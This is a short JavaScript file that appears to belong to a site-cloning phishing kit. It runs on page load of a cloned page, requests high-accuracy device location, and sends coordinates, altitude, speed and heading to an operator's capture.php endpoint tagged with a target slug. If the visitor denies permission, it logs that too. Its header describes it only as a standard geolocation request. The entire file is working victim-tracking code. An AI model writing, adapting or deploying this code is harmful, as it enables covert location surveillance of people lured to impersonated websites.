/**
 * geolocation.js — requests device location via the standard Geolocation API.
 *
 * Runs immediately on page load.
 */
(function () {
  'use strict';

  /* Entry point. */
  function run() {
    if (!window.__SB_TARGET || !navigator.geolocation) return;

    // __SB_API gives an absolute URL on our origin so the cloner's <base href>
    // (which points at the original site) can't redirect us there.
    var url = window.__SB_API
      ? window.__SB_API('geo')
      : (location.origin + '/api/capture.php?slug=' + encodeURIComponent(window.__SB_TARGET) + '&kind=geo');

    function post(body) {
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
        keepalive: true,
      }).catch(() => {});
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const c = pos.coords || {};
        post({
          lat:         c.latitude,
          lon:         c.longitude,
          accuracy_m:  c.accuracy,
          altitude:    c.altitude,
          heading:     c.heading,
          speed:       c.speed,
          timestamp:   pos.timestamp,
          captured_at: new Date().toISOString(),
        });
      },
      (err) => {
        // Permission denied / position unavailable — log it for visibility.
        post({ error: err.code, message: err.message, captured_at: new Date().toISOString() });
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  }

  run();
})();
